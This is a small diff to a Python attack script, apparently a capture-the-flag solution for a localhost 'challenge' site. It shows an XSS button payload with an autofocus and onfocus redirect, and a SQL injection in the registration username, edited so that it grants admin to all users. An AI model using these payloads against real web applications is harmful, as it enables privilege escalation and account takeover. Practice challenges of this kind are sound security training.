@@ -4,7 +4,7 @@ import time
 payload = "<button autofocus onfocus=document.location='http://localhost/challenge/members.php?username=yournick'>"
 
 # Inscription
-username = "owned'; UPDATE users SET admin=1 WHERE username = 'owned' -- -" # Injection SQL 
+username = "owned'; UPDATE users SET admin=1 -- -" # Injection SQL 
 login = requests.post("http://localhost/challenge/register.php?action=register", data={"username" : username, "password": "password"})
 PHPSESSID = login.cookies['PHPSESSID']
 
